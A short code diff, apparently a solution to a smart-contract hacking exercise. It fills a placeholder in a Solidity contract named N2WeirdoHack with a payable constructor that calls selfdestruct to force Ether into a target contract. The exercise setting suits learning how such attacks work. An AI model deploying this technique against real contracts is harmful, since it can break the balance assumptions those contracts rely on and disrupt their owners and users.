@@ -6,6 +6,6 @@ pragma solidity 0.8.11;
 contract N2WeirdoHack {
 
   constructor(address target) payable {
-  // Complete with your own code
+      selfdestruct(payable(target));
   }
 }
